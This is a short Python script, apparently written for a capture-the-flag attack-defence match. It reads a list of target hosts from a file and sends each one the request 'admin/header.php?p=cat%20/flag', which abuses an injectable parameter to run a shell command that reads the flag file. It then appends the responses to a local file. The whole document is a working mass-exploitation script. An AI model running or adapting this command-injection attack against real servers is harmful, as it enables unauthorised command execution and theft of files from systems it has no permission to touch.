from requests.exceptions import ReadTimeout
import requests
import os

ip = []

# 打开文件
with open('../攻击主机/ip.txt', 'r', encoding='utf-8') as file:
    # 逐行读取
    line = file.readline()
    # 循环直到文件末尾
    while line:
        # 将读取的行添加到列表中，移除行尾的换行符
        ip.append(line.strip())
        # 读取下一行
        line = file.readline()

def get(ip):
    for i in range(0,len(ip)):
        try:
            url = ip[i]  
            url = url + 'admin/header.php?p=cat%20/flag'  
            a=requests.get(url, timeout=3)
            p =a.text
            with open("./源码.txt", 'a', encoding='UTF-8') as f: 
                f.write(f"{p}")

        except:
            pass

if os.path.exists("./源码.txt"):
    os.remove("./源码.txt")
a=get(ip)


